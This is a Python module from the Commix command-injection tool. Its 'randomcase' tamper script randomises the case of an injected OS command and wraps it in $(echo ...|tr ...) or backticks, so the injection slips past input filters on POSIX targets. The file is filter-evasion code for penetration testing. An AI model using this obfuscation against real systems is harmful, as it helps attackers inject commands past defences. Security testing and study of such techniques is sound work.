#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from random import choice
from src.utils import settings
from src.core.controller import checks

"""
About: Replaces each character in a user-supplied OS command with a random case.
Notes: This tamper script works against target(s) with a POSIX shell.
       The character ranges are quoted with "'", which is the one quote neither an
       evaluated string nor the shell inside it is already using.
"""

__tamper__ = "randomcase"
__priority__ = settings.PRIORITY.HIGH

# Why this script cannot be applied to the target at hand, or nothing where it can.
def dependencies():
  return checks.tamper_dep_unix_only(__tamper__)

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# Vary the case of the payload's letters, where the shell does not care about it.
def tamper(payload):
  _ = (''.join(choice((str.upper, str.lower))(c) for c in settings.USER_APPLIED_CMD))
  if settings.EXPLOITATION_PHASE:
    if settings.TAMPER_SCRIPTS["rev"]:
      if settings.USE_BACKTICKS:
        _ = _[::-1] + "|rev"
      else:
        _ = "$(echo \"" + _[::-1]  + "\"|rev" + ")" 
    source = payload if settings.USER_APPLIED_CMD in payload else settings.RAW_PAYLOAD
    if settings.USER_APPLIED_CMD in source:
      if settings.USE_BACKTICKS:
        random_case_cmd = "\\`echo " + _ + "|tr '[A-Z]' '[a-z]'\\`"
      else:
        random_case_cmd = "$(echo " + _ + "|tr '[A-Z]' '[a-z]')"
      # Applied to the payload as handed over, not to the untouched original: the scripts run in
      # order, and reaching back past the ones before would throw their work away.
      payload = source.replace(settings.USER_APPLIED_CMD, random_case_cmd)
      if len(settings.WHITESPACES) != 0:
        payload = payload.replace(settings.SINGLE_WHITESPACE, settings.WHITESPACES[0])
  return payload

# eof
